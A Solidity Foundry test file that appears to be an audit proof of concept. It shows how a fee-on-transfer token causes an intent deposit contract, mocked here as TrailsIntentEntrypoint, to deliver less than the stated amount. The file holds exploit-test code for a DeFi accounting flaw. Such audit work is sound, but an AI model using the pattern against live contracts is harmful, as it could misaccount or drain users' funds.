// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface ITrailsIntentEntrypoint {
    function depositToIntentWithPermit(
        address user,
        address token,
        uint256 amount,
        uint256 permitAmount,
        address intentAddress,
        uint256 deadline,
        uint256 nonce,
        uint256 feeAmount,
        address feeCollector,
        uint8 permitV,
        bytes32 permitR,
        bytes32 permitS,
        uint8 sigV,
        bytes32 sigR,
        bytes32 sigS
    ) external;

    function depositToIntent(
        address user,
        address token,
        uint256 amount,
        address intentAddress,
        uint256 deadline,
        uint256 nonce,
        uint256 feeAmount,
        address feeCollector,
        uint8 sigV,
        bytes32 sigR,
        bytes32 sigS
    ) external;
}

contract FeeOnTransferToken is IERC20 {
    using SafeERC20 for IERC20;

    string public constant name = "FeeOnTransferToken";
    string public constant symbol = "FOT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public feePercentage = 1; // 1% fee on transfer

    constructor(uint256 _initialSupply) {
        balanceOf[msg.sender] = _initialSupply;
        totalSupply = _initialSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 fee = (amount * feePercentage) / 100;
        uint256 amountAfterFee = amount - fee;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amountAfterFee;
        balanceOf[address(this)] += fee; // Collect fee
        emit Transfer(msg.sender, to, amountAfterFee);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 fee = (amount * feePercentage) / 100;
        uint256 amountAfterFee = amount - fee;
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amountAfterFee;
        balanceOf[address(this)] += fee; // Collect fee
        emit Transfer(from, to, amountAfterFee);
        return true;
    }
}

contract ExploitTest is Test {
    ITrailsIntentEntrypoint public trailsIntentEntrypoint;
    FeeOnTransferToken public feeOnTransferToken;
    address public user = address(0x1);
    address public intentAddress = address(0x2);
    address public feeCollector = address(0x3);

    function setUp() public {
        // Deploy the fee-on-transfer token
        feeOnTransferToken = new FeeOnTransferToken(1000 ether);

        // Deploy the TrailsIntentEntrypoint contract (mocked for this test)
        trailsIntentEntrypoint = ITrailsIntentEntrypoint(address(new MockTrailsIntentEntrypoint()));

        // Fund the user with tokens
        feeOnTransferToken.transfer(user, 100 ether);

        // Approve the TrailsIntentEntrypoint contract to spend user's tokens
        vm.prank(user);
        feeOnTransferToken.approve(address(trailsIntentEntrypoint), type(uint256).max);
    }

    function test_exploit() public {
        uint256 initialBalance = feeOnTransferToken.balanceOf(intentAddress);

        // Step 1: User deposits fee-on-transfer token
        vm.prank(user);
        trailsIntentEntrypoint.depositToIntent(
            user,
            address(feeOnTransferToken),
            50 ether,
            intentAddress,
            block.timestamp + 1 days,
            0,
            5 ether,
            feeCollector,
            0,
            bytes32(0),
            bytes32(0)
        );

        // Step 2: Check the balance of the intentAddress
        uint256 finalBalance = feeOnTransferToken.balanceOf(intentAddress);

        // Assert the vulnerability: The intentAddress received less than expected due to fee-on-transfer
        assertLt(finalBalance, initialBalance + 50 ether);
    }
}

contract MockTrailsIntentEntrypoint is ITrailsIntentEntrypoint {
    using SafeERC20 for IERC20;

    function depositToIntentWithPermit(
        address user,
        address token,
        uint256 amount,
        uint256 permitAmount,
        address intentAddress,
        uint256 deadline,
        uint256 nonce,
        uint256 feeAmount,
        address feeCollector,
        uint8 permitV,
        bytes32 permitR,
        bytes32 permitS,
        uint8 sigV,
        bytes32 sigR,
        bytes32 sigS
    ) external override {
        // Mock implementation
    }

    function depositToIntent(
        address user,
        address token,
        uint256 amount,
        address intentAddress,
        uint256 deadline,
        uint256 nonce,
        uint256 feeAmount,
        address feeCollector,
        uint8 sigV,
        bytes32 sigR,
        bytes32 sigS
    ) external override {
        IERC20(token).safeTransferFrom(user, intentAddress, amount);
        if (feeAmount > 0 && feeCollector != address(0)) {
            IERC20(token).safeTransferFrom(user, feeCollector, feeAmount);
        }
    }
}